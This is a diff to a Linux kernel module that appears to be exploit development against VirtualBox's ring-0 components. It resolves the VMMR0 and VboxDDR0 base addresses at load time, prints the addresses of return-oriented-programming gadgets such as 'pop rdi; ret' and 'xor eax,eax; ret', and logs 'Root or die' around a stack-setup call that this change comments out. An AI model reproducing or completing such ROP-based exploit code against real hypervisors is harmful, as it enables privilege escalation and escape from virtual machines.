@@ -7,8 +7,10 @@
 #include <linux/init.h>
 #include <linux/stat.h>
 
-static void *VMMR0 = 0xffffffffa0955020;
-static void *VboxDDR0 = 0xffffffffa08c1020;
+#include "helper.c"
+
+static void *VMMR0 = NULL;
+static void *VboxDDR0 = NULL;
 // static void *VboxDD2R0 = 0xffffffffa0066020U;
 
 /*
@@ -35,6 +37,17 @@ void setup_stack(void) {
 }
 
 static int __init hello_5_init(void) {
+    int error;
+    VMMR0 = find_addr("VMMR0", &error);
+    if (error || VMMR0 == NULL) {
+      return 1;
+    }
+    VboxDDR0 = find_addr("VboxDDR0", &error);
+    if (error || VboxDDR0 == NULL) {
+      return 1;
+    }
+	printk(KERN_INFO "VMMR0: %p\n", VMMR0);
+	printk(KERN_INFO "VboxDDR0: %p\n", VboxDDR0);
 	printk(KERN_INFO "pop rdi; pop rbp; ret: %p: %p\n", VboxDDR0 + 0xdbaU, *(int *)(VboxDDR0 + 0xdbaU));
 	printk(KERN_INFO "pop rdi; ret: %p: %p\n", VMMR0 + 0x7b62aU, *(int *)(VMMR0 + 0x7b62aU));
 	printk(KERN_INFO "pop rax; ret: %p: %p\n", VMMR0 + 0x1f7bdU, *(int *)(VMMR0 + 0x1f7bdU));
@@ -44,7 +57,7 @@ static int __init hello_5_init(void) {
 	printk(KERN_INFO "xor eax,eax; ret: %p: %p\n", VMMR0 + 0x8b8U, *(int *)(VMMR0 + 0x8b8U));
 
 	printk(KERN_INFO "Root or die\n");
-	setup_stack();
+	// setup_stack();
 	printk(KERN_INFO "Success\n");
 	return 0;
 }
